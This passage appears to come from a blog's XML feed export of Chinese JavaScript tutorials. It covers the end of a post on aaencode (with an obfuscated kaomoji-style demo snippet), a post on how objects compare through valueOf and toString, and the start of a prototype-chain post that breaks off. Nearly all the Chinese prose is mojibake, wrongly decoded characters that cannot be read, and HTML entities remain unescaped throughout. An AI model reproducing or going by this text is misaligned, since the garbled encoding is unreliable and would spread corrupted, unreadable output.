[ï¾Ÿï½°ï¾Ÿ] + ((ï¾ŸĞ”ï¾Ÿ)   +&#x27;_&#x27;) [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ ((ï¾Ÿï½°ï¾Ÿ==3) +&#x27;_&#x27;) [ï¾ŸÎ˜ï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ==3) +&#x27;_&#x27;) [(ï¾Ÿï½°ï¾Ÿ) - (ï¾ŸÎ˜ï¾Ÿ)]+(ï¾ŸĞ”ï¾Ÿ) [&#x27;c&#x27;]+((ï¾ŸĞ”ï¾Ÿ)+&#x27;_&#x27;) [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ (ï¾ŸĞ”ï¾Ÿ) [&#x27;o&#x27;]+((ï¾Ÿï½°ï¾Ÿ==3) +&#x27;_&#x27;)    [ï¾ŸÎ˜ï¾Ÿ];(ï¾ŸĞ”ï¾Ÿ) [&#x27;_&#x27;] =(o^_^o) [ï¾Ÿoï¾Ÿ] [ï¾Ÿoï¾Ÿ];(ï¾ŸÎµï¾Ÿ)=((ï¾Ÿï½°ï¾Ÿ==3) +&#x27;_&#x27;) [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸĞ”ï¾Ÿ) .ï¾ŸĞ”ï¾Ÿï¾‰+((ï¾ŸĞ”ï¾Ÿ)+&#x27;_&#x27;) [(ï¾Ÿï½°ï¾Ÿ) + (ï¾Ÿï½°ï¾Ÿ)]+((ï¾Ÿï½°ï¾Ÿ==3) +&#x27;_&#x27;) [o^_^o -ï¾ŸÎ˜ï¾Ÿ]+    ((ï¾Ÿï½°ï¾Ÿ==3) +&#x27;_&#x27;) [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸÏ‰ï¾Ÿï¾‰ +&#x27;_&#x27;) [ï¾ŸÎ˜ï¾Ÿ]; (ï¾Ÿï½°ï¾Ÿ)+=(ï¾ŸÎ˜ï¾Ÿ); (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]=&#x27;\\&#x27;; (ï¾ŸĞ”ï¾Ÿ).ï¾ŸÎ˜ï¾Ÿï¾‰=(ï¾ŸĞ”ï¾Ÿ+ ï¾Ÿï½°ï¾Ÿ)[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)];(oï¾Ÿï½°ï¾Ÿo)=(ï¾ŸÏ‰ï¾Ÿï¾‰ +&#x27;_&#x27;)[c^_^o];(ï¾ŸĞ”ï¾Ÿ)     [ï¾Ÿoï¾Ÿ]=&#x27;\&quot;&#x27;;(ï¾ŸĞ”ï¾Ÿ) [&#x27;_&#x27;] ( (ï¾ŸĞ”ï¾Ÿ) [&#x27;_&#x27;] (ï¾ŸÎµï¾Ÿ+(ï¾ŸĞ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿ    Î˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+     ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((o^_^o) +(o^_^o))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]) (ï¾ŸÎ˜ï¾Ÿ)) (&#x27;_&#x27;);

ä»”ç´°è§€å¯Ÿæœƒç™¼ç¾è£¡é¢å…¶å¯¦æœ‰å¾ˆå¤šåˆ†è™Ÿï¼Œæ˜¯æŠŠå¾ˆå¤šè¡Œçµ„åˆåœ¨ä¸€èµ·ï¼Œæˆ‘å€‘æŒ‘è£¡é¢æ¯”è¼ƒçŸ­çš„ä¸€è¡Œä¾†çœ‹ï¼šï¼ˆåº•ä¸‹çš„ç¨‹å¼ç¢¼å› ç‚ºç‰¹æ®Šå­—å…ƒçš„é—œä¿‚æœ‰å¤šåšä¸€é»è™•ç†ï¼Œè·ŸåŸæœ¬çš„æœ‰äº›è¨±å·®ç•°ï¼‰
o=ï¼ˆË™_Ë™ï¼‰  =_=3; 

çœ‹èµ·æ˜¯é¡æ–‡å­—ï¼Œä½†å…¶å¯¦æ²’é‚£éº¼ç°¡å–®ï¼Œæˆ‘æŠŠç©ºæ ¼éš”å¤šä¸€é»ï¼Œä½ å°±çŸ¥é“æˆ‘åœ¨è¬›ä»€éº¼äº†ï¼š
o = ï¼ˆË™_Ë™ï¼‰   =  _  = 3; 


å…¶å¯¦å°±æ˜¯ï¼š
_ = 3;ï¼ˆË™_Ë™ï¼‰ = _;o = ï¼ˆË™_Ë™ï¼‰  ;

ä¹Ÿå°±æ˜¯è®“ o, ï¼ˆË™_Ë™ï¼‰, _ éƒ½æ˜¯ 3æ‰€ä»¥ Ë™_Ë™ åªæ˜¯ä¸€å€‹è®Šæ•¸åç¨±ï¼Œç„¶å¾Œç”¨ () åŒ…èµ·ä¾†è®Šæˆé¡æ–‡å­—ï¼Œä½†é€™æ‹¬å¼§åœ¨ç¨‹å¼ä¸Šå…¶å¯¦æ²’æœ‰ä»€éº¼æ„ç¾©
è‡³æ–¼å…¶ä»–æ®µçš„ç¨‹å¼ç¢¼ï¼Œåšçš„äº‹æƒ…ä¹Ÿéƒ½å¤§åŒå°ç•°ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å€‘å¯ä»¥è‡ªå·±å†å»åˆ†æï¼Œæˆ–è€…ç›´æ¥å³éµ-&gt;æª¢è¦–åŸå§‹ç¢¼å»çœ‹çœ‹æ˜¯æ€éº¼ encode çš„ã€‚
çµè«–æˆ‘ç¬¬ä¸€æ¬¡çœ‹åˆ° aaencode çš„æ™‚å€™ä¹Ÿæ˜¯ï¼šã€Œå“‡ï¼ã€åš‡äº†ä¸€è·³ï¼Œä¸è§£ç‚ºä»€éº¼ç”¨é¡æ–‡å­—ä¹Ÿå¯ä»¥å¯«ç¨‹å¼ï¼Œå¾Œä¾†ä»”ç´°çœ‹æ‰äº†è§£åˆ°å…¶å¯¦é¡æ–‡å­—æœ¬ä¾†å°±æ˜¯ä¸€å †ç¬¦è™Ÿçµ„æˆçš„ï¼Œå¯ä»¥å¯«å‡ºç¨‹å¼ä¹Ÿæ˜¯ä»¶å¾ˆæ­£å¸¸çš„äº‹æƒ…ã€‚  
ä½†æ¯æ¬¡çœ‹åˆ°ä»Šå¤©ä»‹ç´¹çš„é€™å…©ç¨®ç‰¹åˆ¥çš„å¯«æ³•ï¼Œé‚„æ˜¯å¾ˆä½©æœä½œè€…ï¼Œç•¶åˆæ€éº¼æƒ³åˆ°å¯ä»¥ç”¨é€™æ¨£å­ä¾†å¯«ç¨‹å¼ã€‚å¸Œæœ›é€™ç¯‡æ–‡ç« çš„ä»‹ç´¹èƒ½è®“å¤§å®¶å°ç¨‹å¼ç¢¼æœ‰é»æ–°çš„æƒ³æ³•ï¼Œèªªä¸å®šçµ¦äº†ä½ éˆæ„Ÿï¼Œå¯ä»¥é–‹ç™¼å‡ºæ›´å²å®³çš„å¯«æ³•ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>jsfuck</tag>
        <tag>aaencode</tag>
      </tags>
  </entry>
  <entry>
    <title>ç†è§£ JavaScript ä¸­ç‰©ä»¶çš„æ¯”å¤§å°è¡Œç‚º</title>
    <url>/2019/06/16/javascript-obj-compare/</url>
    <content><![CDATA[å‰è¨€åœ¨ JavaScript ä¸­å¾ˆå¤šè¡Œçˆ²ç”¨å…¶ä»–ç¨‹å¼èªè¨€çš„è§’åº¦æˆ–æ˜¯ç›´è§€è§’åº¦ä¾†çœ‹éƒ½éå¸¸ä¸åˆç†ã€‚æœ‰äº›äººçŸ¥é“é€™äº›è¡Œç‚ºï¼Œä½†ä¸äº†è§£å…§éƒ¨é‹ä½œæ–¹å¼ã€‚è€Œæˆ‘è‡ªå·±åœ¨å­¸ç¿’æ™‚ï¼Œæœƒå˜—è©¦äº†è§£å…§éƒ¨çš„è¡Œç‚ºã€‚äº†è§£éå¾Œï¼Œä¹‹å¾Œé‡åˆ°åŒæ¨£è¡Œç‚ºæ™‚ï¼Œå¾ˆè‡ªç„¶çš„å°±çŸ¥é“æŸè¡Œç‚ºæ‡‰è©²å›å‚³ä»€éº¼æ¨£çš„å€¼ï¼Œè€Œä¸å†èªç‚ºé€™æ˜¯ä¸€é¡†åœ°é›·ã€‚
é€™ç¯‡æ–‡ç« è¦æ¢è¨çš„æ˜¯ JavaScript åœ¨å…©å€‹ç‰©ä»¶ä¸­äº’ç›¸æ¯”è¼ƒæ‰€ç”¨çš„ä¾æ“šç‚ºä½•ã€‚ç¶²è·¯ä¸Šå¤§éƒ¨åˆ†çš„æ–‡ç« éƒ½åªæœ‰è¨è«– ==, !=, === ä»¥åŠ !==ã€‚é€™ç¯‡æ–‡ç« è¦æ¢è¨çš„æ˜¯ åœ¨å…©å€‹ç‰©ä»¶ä¹‹é–“ä½¿ç”¨å¤§æ–¼å°æ–¼å»æ¯”è¼ƒ JavaScript å¦‚ä½•è™•ç†é€™ä¸€ä»¶äº‹æƒ…ã€‚
å…ˆçœ‹å¹¾ç¨®å¸¸è¦‹çš„æƒ…æ³å…ˆè¤‡ç¿’ä¸€ä¸‹å¹¾ç¨®ä¸åŒå‹æ…‹ä¹‹é–“çš„æ¯”è¼ƒä¾æ“š
&gt; 100 &gt; 10true&gt; 100 &gt; &quot;10&quot; //(å­—ä¸²èˆ‡æ•¸å­—æ¯”è¼ƒï¼Œæœƒå°‡å­—ä¸²è½‰ç‚ºæ•¸å­—ä¾†æ¯”è¼ƒï¼Œä½¿ç”¨ Number()è½‰å‹)true&gt; &quot;100&quot; &gt; &quot;10&quot; //(å…©è€…éƒ½æ˜¯å­—ä¸²ï¼ŒæŒ‰ç…§ ascii code æ¯”å¤§å°ï¼Œå¦‚æœç›¸ç­‰å°±å¾€ä¸‹ä¸€å€‹å­—å…ƒæ¯”ã€‚åˆ‡è¨˜ï¼ä¸¦ä¸æ˜¯å°‡å…©å€‹å­—ä¸²éƒ½è½‰ç‚ºæ•¸å­—ä¾†æ¯”è¼ƒ)true&gt; &quot;abc&quot; &gt; &quot;aaa&quot; //(åŒä¸Šè¿°)true&gt; &quot;ab&quot; &gt; &quot;ac&quot;false

ç‰©ä»¶çš„æ¯”è¼ƒè¦å‰‡ä¾†é»ç§‘æ™®é€™æ¬¡çš„é‡é»åœ¨æ–¼å…©å€‹ç‰©ä»¶çš„æ¯”è¼ƒæ˜¯ä¾æ“šä½•è€…ä¾†æ¯”è¼ƒï¼Œé¦–å…ˆè¦å…ˆçŸ¥é“ JavaScript æœ‰å¹¾ç¨®å‹æ…‹

null
undefined
boolean
number
string
symbol
object

æ‰€æœ‰ JavaScript çš„å‹æ…‹éƒ½åœ¨é€™ä¸ƒç¨®ä¹‹å…§ã€‚ç„¶è€Œï¼Œé™¤äº† object ä»¥å¤–ï¼Œéƒ½å±¬æ–¼åŸºæœ¬å‹æ…‹(primitive data type)ã€‚
æ¯”è¼ƒçš„ä¾æ“šç‰©ä»¶çš„æ¯”è¼ƒæµç¨‹ç‚ºä»¥ä¸‹(è‹¥æˆåŠŸå‰‡åœï¼Œå¤±æ•—å‰‡å¾€ä¸‹ä¸€æ­¥)ï¼š

å‘¼å«ç‰©ä»¶å…§çš„ valueOf æ–¹æ³•æ±‚å¾— return å€¼(å€¼å¿…é ˆç‚º primitive data type)

(è‹¥é primitive data tpye æˆ–æ˜¯æ²’æœ‰ valueOf æ–¹æ³•å‰‡å¾€ä¸‹)

å‘¼å« toString æ–¹æ³•æ±‚å¾— return å€¼(å€¼å¿…é ˆç‚º primitive data type)

(è‹¥é primitive data tpye æˆ–æ˜¯æ²’æœ‰ valueOf æ–¹æ³•å‰‡å¾€ä¸‹)

æ‹‹å‡ºéŒ¯èª¤ (TypeError: Cannot convert object to primitive value)

é€²è¡Œå¯¦é©—
å¯¦é©—ä¸€ (object å…§çš„ valueOf)ï¼š

let obj = &#123;    valueOf() &#123;        return 123;    &#125;,    toString() &#123;        return &#123;&#125;;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);//output: great!


å¯¦é©—äºŒ (valueOf å›å‚³å€¼ä¸æ˜¯ primitive data type)ï¼š

let obj = &#123;    valueOf() &#123;        return &#123;&#125;;    &#125;,    toString() &#123;        return 123;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);//output: great!


å¯¦é©—ä¸‰ (valueOf èˆ‡ toString çš„æ¯”è¼ƒé †åº)ï¼š

let obj = &#123;    valueOf() &#123;        return 200;    &#125;,    toString() &#123;        return 50;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);else console.log(&quot;QQ&quot;);//output: great!

let obj = &#123;    valueOf() &#123;        return 50;    &#125;,    toString() &#123;        return 200;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);else console.log(&quot;QQ&quot;);//output: QQ


å¯¦é©—å››ï¼ˆå…©è€…å›å‚³å€¼éƒ½éç‚º primitive data typeï¼Œæ‹‹å‡ºéŒ¯èª¤ï¼‰

let obj = &#123;    valueOf() &#123;        return &#123;&#125;;    &#125;,    toString() &#123;        return &#123;&#125;;    &#125;&#125;;if (obj &gt; 100) console.log(&quot;great!&quot;);//output://if (obj &gt; 100) console.log(&quot;great!&quot;);//        ^//TypeError: Cannot convert object to primitive value//    at Object.&lt;anonymous&gt; (/Users/yiyuchang/dev/tmp/article/example.js:10:9)//    ......

ç©ºç‰©ä»¶é è¨­çš„ valueOf, toString ç‚ºä½•let obj = &#123;&#125;;console.log(obj.valueOf());console.log(obj.toString());if (obj == &quot;[object Object]&quot;) console.log(&quot;great!&quot;);//output:////&#123;&#125;//[object Object]//great!

é è¨­æƒ…æ³ä¸‹ç‰©ä»¶æ˜¯çš„ valueOf æ˜¯å›å‚³ç©ºç‰©ä»¶ {}ï¼Œè€Œ toString å‰‡æ˜¯å›å‚³ [object Object] å­—ä¸²ï¼
çµè«–é€éä»¥ä¸Šçš„å¯¦é©—ï¼Œé™¤äº†çŸ¥é“ç‰©ä»¶ä¾æ“šä½•è€…ä¾†æ¯”è¼ƒå¤§å°ã€‚ç›¸ä¿¡ä¹Ÿå° valueOf ä»¥åŠ toString æœ‰æ›´æ·±ä¸€å±¤çš„äº†è§£ã€‚å¦‚æ­¤ä¸€ä¾†å°ç‰©ä»¶é€™å€‹å±¬æ€§çš„è¡Œç‚ºä¹Ÿèƒ½åŠ ä»¥æŒæ¡ã€‚
JavaScript çš„å‹æ…‹ç°¡å–®ä¾†èªªå°±å¦‚åŒå‰é¢æ‰€èªªï¼Œä¸€é¡ç‚º primitive data type å¦å¤–ä¸€é¡å°±æ˜¯ç‰©ä»¶(object)ã€‚å¾ˆå¤šæ–°æ‰‹å¸¸å¸¸ææ··çš„è¡Œç‚ºå…¶å¯¦ä¹Ÿå°±åªæ˜¯é€™å…©ç¨®å±¬æ€§ä¸å¤ªäº†è§£ç½·äº†ã€‚
åƒæ˜¯:
let str = &#x27;hi&#x27;let str2 = String(&#x27;hi&#x27;)

é€™å…©å€‹å­—ä¸²çš„å…§å®¹åˆ°åº•ä¸€æ¨£ä¸ä¸€æ¨£ï¼Ÿç”¨ == ä»¥åŠ === çš„å›å‚³å€¼ç‚ºä½•ï¼Ÿ

å…©å€‹è®Šæ•¸å…§å®¹éƒ½æ˜¯ â€˜hiâ€™ï¼Œæ‰€ä»¥ç”¨ == çš„çµæœæœƒæ˜¯ true
ä»–å€‘éƒ½æ˜¯ primitive data typeï¼Œæ‰€ä»¥ç”¨ === åŒ…å«å‹æ…‹ä¹Ÿä¸€èµ·æ¯”è¼ƒç•¶ç„¶ä¹Ÿæœƒä¸€æ¨£

ä½†å¦‚æœç”¨ new String(&#39;hi&#39;) ç”¢ç”Ÿå‡ºä¾†æ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œæ‰€ä»¥èˆ‡å‰é¢å…©è€…ç”¨ === æ¯”è¼ƒçµæœå‰‡æœƒæ˜¯ falseã€‚
ç†è§£é€™äº›å¹³å¸¸ä¸æœƒä»”ç´°æ€è€ƒçš„å•é¡Œæ›´æœ‰åŠ©æ–¼æŒæ¡é€™é–€èªè¨€ï¼Œæ—¥å¾Œæˆ‘ä¹Ÿæœƒæ™‚å¸¸å°‡æˆ‘çš„å­¸ç¿’æ­·ç¨‹å¯«æˆæ–‡ç« ï¼Œç™¼ä½ˆæ–¼æˆ‘çš„éƒ¨è½æ ¼èˆ‡æ­¤ï¼Œè¬è¬å¤§å®¶ä»”ç´°çœ‹å®Œé€™ç¯‡æ–‡ç« ã€‚
é—œæ–¼ä½œè€…å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ yiyuã€‚åœ¨ç¶²è·¯ä¸Šéƒ½ç”¨ yiyu0x ä½œç‚ºæˆ‘çš„ idã€‚ç›®å‰æ˜¯è³‡è¨Šå·¥ç¨‹å­¸ç³»å¤§ä¸‰çš„å­¸ç”Ÿï¼Œå¹³å¸¸å–œæ­¡å¯«ç¨‹å¼ï¼Œç”¨ç¨‹å¼è§£æ±ºæ—¥å¸¸ç”Ÿæ´»ä¸­çš„å•é¡Œã€‚JavaScript æ˜¯ä¸€é–€è¿‘æœŸæˆ‘éå¸¸ç†±æ„›çš„èªè¨€ï¼Œç›¸è¼ƒæ–¼å…¶ä»–èªè¨€ï¼Œè±å¯Œçš„å¥—ä»¶ä»¥åŠç•°æ­¥çš„ç‰¹æ€§æ˜¯æˆ‘ç†±æ„›å®ƒçš„åŸå› ã€‚æ­¤ç¯‡æ–‡ç« ä¹ŸåŒæ™‚åˆŠç™»æ–¼æˆ‘çš„å€‹äºº blogã€‚
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>è©²ä¾†ç†è§£ JavaScript çš„åŸå‹éŠäº†</title>
    <url>/2017/04/22/javascript-prototype/</url>
    <content><![CDATA[å‰è¨€è€å¯¦èªª JavaScript çš„åŸå‹éŠä¸€ç›´æ˜¯æˆ‘å¾ˆæ‡¼æ€•çš„ä¸€å€‹ä¸»é¡Œï¼Œç†ç”±å¾ˆç°¡å–®ï¼Œå› ç‚ºçœŸçš„ä¸å¤ªå¥½ç†è§£ã€‚å…‰æ˜¯ä¸€å †åè©è·ŸéŒ¯ç¶œè¤‡é›œçš„é—œä¿‚å°±å¯ä»¥æŠŠä½ æç˜‹ï¼Œä¾‹å¦‚èªªprototype, __proto__, constructor, Object.prototype, Function.prototype, newç­‰ç­‰ã€‚
å¯æ˜¯å‘¢ï¼Œé€™åˆç¢ºå¯¦æ˜¯ JavaScript å¾ˆé‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸”æ˜¯é¢è©¦çš„å¿…è€ƒé¡Œï¼Œå°±ç®—ç¾åœ¨ä¸æ‡‚ï¼Œä»¥å¾Œé²æ—©æœ‰ä¸€å¤©è¦æŠŠå®ƒå¼„æ‡‚ï¼Œä¸ç„¶çš„è©±æ°¸é éƒ½æ²’è¾¦æ³•æŠŠè‡ªå·±çš„æŠ€è¡“èƒ½åŠ›å¾€ä¸Šæé«˜ä¸€å€‹æª”æ¬¡ã€‚
æœ‰é—œåŸå‹éŠçš„æ–‡ç« ä½ å¯ä»¥åœ¨ç¶²è·¯ä¸Šæœåˆ°ä¸€å¤§å †ï¼Œæ¯ä¸€ç¯‡çš„ç†è§£æ–¹å¼éƒ½ä¸å¤ªä¸€æ¨£ï¼Œæœ‰äº›ç›´æ¥æ¬å‡ºä¸€å¤§å †å°ˆæœ‰åè©ï¼Œåš‡éƒ½æŠŠä½ åš‡æ­»äº†ã€‚è€Œæˆ‘ä¹Ÿæ˜¯ä¸€ç›´åˆ°æœ€è¿‘ï¼Œçœ‹äº†å¹¾ç¯‡æˆ‘è¦ºå¾—åˆ‡å…¥è§’åº¦æ¯”è¼ƒä¸éŒ¯çš„æ–‡ç« ï¼Œæ‰çœŸæ­£å°åŸå‹éŠæœ‰æ¯”è¼ƒæ·±åˆ»çš„ç†è§£ã€‚
å°±è¶è‘—ç¾åœ¨é€™å€‹æ©Ÿæœƒï¼Œè®“æˆ‘å€‘å¤šç­è§£ä¸€é» JavaScript çš„åŸå‹éŠå§ï¼é€™ç¯‡é©åˆå° JavaScript æœ‰ä¸€é»æ¦‚å¿µä½†åˆä¸æ˜¯å¾ˆæ¸…æ¥šçš„äººè§€çœ‹ï¼Œå¦‚æœæ–‡ç« ä¸­æœ‰è¬›éŒ¯çš„åœ°æ–¹ï¼Œä¹Ÿéº»ç…©ä¸ååœ¨è©•è«–ä¸­æŒ‡å‡ºï¼Œæ„Ÿè¬ã€‚
JavaScript ä¸­çš„ classè¦ç†è§£åŸå‹éŠï¼Œå¯ä»¥å…ˆå¾é€™å…©ç¯‡æˆ‘è¦ºå¾—å¾ˆæ£’çš„åˆ‡å…¥è§’åº¦é–‹å§‹ï¼š

Javascriptç»§æ‰¿æœºåˆ¶çš„è®¾è®¡æ€æƒ³
ä»è®¾è®¡åˆè¡·è§£é‡Š JavaScript åŸå‹é“¾

é€™å…©ç¯‡è¬›åˆ°ç‚ºä»€éº¼ç•¶åˆ JavaScript çš„æ©Ÿåˆ¶æ˜¯é€™æ¨£è¨­è¨ˆçš„ï¼Œæˆ‘èªç‚ºå¾é€™å€‹è§’åº¦é–‹å§‹ç†è§£ï¼Œæœƒæ˜¯ä¸€å€‹æ¯”è¼ƒå¥½çš„é–‹å§‹ã€‚ï¼ˆå¼·çƒˆå»ºè­°å…ˆçœ‹éé€™å…©ç¯‡ä¹‹å¾Œå†å¾€ä¸‹çœ‹ï¼Œæœƒå¹«åŠ©ä½ æ›´ç­è§£åŸå‹éŠåˆ°åº•æ˜¯ä»€éº¼æ±è¥¿ï¼‰
é¦–å…ˆå‘¢ï¼ŒJavaScript ä¸åƒ Java æˆ–æ˜¯å…¶ä»–ç‰©ä»¶å°å‘çš„ç¨‹å¼èªè¨€ï¼Œå®ƒæ˜¯æ²’æœ‰ class çš„ï¼ˆES6 çš„ class ä¹Ÿåªæ˜¯èªæ³•ç³–è€Œå·²ï¼‰ã€‚å¯æ˜¯å„˜ç®¡æ²’æœ‰ classï¼Œå»é‚„æ˜¯å¯ä»¥è¨­è¨ˆå‡ºä¸€å€‹é¡ä¼¼çš„æ©Ÿåˆ¶ä¾†é”æˆå·®ä¸å¤šçš„åŠŸèƒ½ã€‚
åœ¨ Java è£¡é¢ï¼Œå¦‚æœä½ è¦å¾ class ç”Ÿå‡ºä¸€å€‹ instance çš„è©±ï¼Œä½ å¯ä»¥é€™æ¨£å¯«ï¼š
Point p = new Point();

æ–¼æ˜¯ JavaScript å°±æŠŠé€™å€‹èªæ³•æ‹¿ä¾†ç”¨ï¼Œæœ‰äº†newé€™å€‹é—œéµå­—ã€‚å¯æ˜¯ JavaScript åˆæ²’æœ‰ classï¼Œnewå¾Œé¢è¦æ¥ä»€éº¼å‘¢ï¼Ÿ
é€™æ™‚å€™ä»–å°±æƒ³åˆ°ï¼Œæ¯ä¸€å€‹ class åœ¨åˆå§‹åŒ–çš„æ™‚å€™ï¼Œä¸æ˜¯éƒ½æœƒå‘¼å« constructor å—ï¼Ÿä¹Ÿå°±æ˜¯æ§‹é€ å‡½æ•¸ï¼Œé‚£åœ¨ JavaScript è£¡é¢ï¼Œå¾Œé¢å°±æ¥æ§‹é€ å‡½æ•¸å§ï¼
æ–¼æ˜¯ï¼Œä¸‹é¢çš„ç¨‹å¼ç¢¼å°±å¾ˆå¥½ç†è§£äº†ï¼š
// constructorfunction Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  var nick = new Person(&#x27;nick&#x27;, 18);var peter = new Person(&#x27;peter&#x27;, 18);

å°±å¦‚åŒä¸Šé¢è¬›åˆ°çš„ä¸€æ¨£ï¼ŒPersonå°±æ˜¯ä¸€å€‹æ§‹é€ å‡½æ•¸ï¼Œå¯ä»¥ç”¨newé€™å€‹é—œéµå­— new å‡ºä¸€å€‹ instance ä¾†ã€‚
å¦‚æœä½ åªçœ‹ä¸‹é¢å®£å‘Š nick é‚£ä¸€è¡Œï¼ˆvar nick = new Person(&#39;nick&#39;, 18);ï¼‰ï¼Œèªæ³•æ˜¯ä¸æ˜¯è·Ÿä½ åœ¨å¯« Java çš„æ™‚å€™æœ‰ 87 åˆ†åƒï¼Ÿé™¤æ­¤ä¹‹å¤–ï¼Œä½ ä¹Ÿå¯ä»¥å¹«PersonåŠ å…¥ä¸€äº›æ–¹æ³•ã€‚
function Person(name, age) &#123;  this.name = name;  this.age = age;  this.log = function () &#123;    console.log(this.name + &#x27;, age:&#x27; + this.age);  &#125;&#125;  var nick = new Person(&#x27;nick&#x27;, 18);nick.log(); // nick, age:18  var peter = new Person(&#x27;peter&#x27;, 20);peter.log(); // peter, age:20

å¯æ˜¯é€™æ¨£å…¶å¯¦é‚„æœ‰ä¸€å€‹å°å•é¡Œï¼Œ name è·Ÿ age é€™å…©å€‹å±¬æ€§ï¼Œå¾ˆæ˜é¡¯æ˜¯æ¯ä¸€å€‹ instance éƒ½æœƒä¸ä¸€æ¨£çš„ã€‚å¯æ˜¯ log é€™å€‹ methodï¼Œå…¶å¯¦æ˜¯æ¯ä¸€å€‹ instance å½¼æ­¤ä¹‹é–“å¯ä»¥å…±äº«çš„ï¼Œå› ç‚ºéƒ½åœ¨åšåŒä¸€ä»¶äº‹æƒ…ã€‚
åœ¨ç¾åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œé›–ç„¶ nick çš„ log é€™å€‹ function è·Ÿ peter çš„ log é€™å€‹ function æ˜¯åœ¨åšåŒä¸€ä»¶äº‹ï¼Œä½†å…¶å¯¦é‚„æ˜¯ä½”ç”¨äº†å…©ä»½ç©ºé–“ï¼Œæ„æ€å°±æ˜¯ä»–å€‘å…¶å¯¦æ˜¯å…©å€‹ä¸åŒçš„ functionã€‚
function Person(name, age) &#123;  this.name = name;  this.age = age;  this.log = function () &#123;    console.log(this.name + &#x27;, age:&#x27; + this.age);  &#125;&#125;  var nick = new Person(&#x27;nick&#x27;, 18);var peter = new Person(&#x27;peter&#x27;, 20);  console.log(nick.log === peter.log) // false

é‚£æ€éº¼è¾¦å‘¢ï¼Ÿæˆ‘å€‘å¯ä»¥æŠŠé€™å€‹ function æŠ½å‡ºä¾†ï¼Œè®Šæˆæ‰€æœ‰ Person éƒ½å¯ä»¥å…±äº«çš„æ–¹æ³•ã€‚è¬›åˆ°é€™é‚Šï¼Œä½ æ‡‰è©²æœ‰è½éä¸€å€‹æ±è¥¿å«åšprototypeã€‚åªè¦æŠŠ log é€™å€‹ function æŒ‡å®šåœ¨ Person.prototype ä¸Šé¢ï¼Œæ‰€æœ‰ Person çš„ instance éƒ½å¯ä»¥å…±äº«é€™å€‹æ–¹æ³•ã€‚
function Person(name, age) &#123;  this.name = name;  this.age = age;&#125;  Person.prototype.log = function () &#123;  console.log(this.name + &#x27;, age:&#x27; + this.age);&#125;  var nick = new Person(&#x27;nick&#x27;, 18);var peter = new Person(&#x27;peter&#x27;, 20);  console.log(nick.log === peter.log) // true  // åŠŸèƒ½ä¾èˆŠè·Ÿä¹‹å‰ä¸€æ¨£nick.log(); // nick, age:18peter.log(); // peter, age:20

æœ‰äº›äººæœƒç›´æ¥åœ¨ Array.prototype ä¸Šé¢åŠ ä¸€äº›å‡½å¼ï¼Œè®“è‡ªå·±å¯ä»¥æ›´æ–¹ä¾¿åœ°åšä¸€äº›æ“ä½œï¼ŒåŸç†ä¹Ÿæ˜¯é€™æ¨£ã€‚å¯æ˜¯ä¸€èˆ¬ä¾†èªªï¼Œä¸æ¨è–¦ç›´æ¥å»ä¿®æ”¹ä¸å±¬æ–¼ä½ çš„ Objectã€‚
Array.prototype.last = function () &#123;    return this[this.length - 1];&#125;;  console.log([1,2,3].last()) // 3

